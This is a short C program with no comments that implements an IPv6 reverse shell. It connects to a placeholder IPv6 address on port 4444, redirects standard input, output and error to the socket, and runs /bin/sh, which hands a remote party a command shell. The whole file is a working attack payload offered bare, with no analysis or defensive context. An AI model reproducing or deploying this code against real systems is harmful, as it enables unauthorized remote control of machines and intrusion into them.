#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET6, SOCK_STREAM, 0);

	struct sockaddr_in6 my_sockaddr;
	my_sockaddr.sin6_family = AF_INET6;
	inet_pton(AF_INET6, "xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx", &(my_sockaddr.sin6_addr));
	my_sockaddr.sin6_port = htons(4444);
 	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	int i;
	for(i = 0; i < 3; i++)
		dup2(my_socket, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
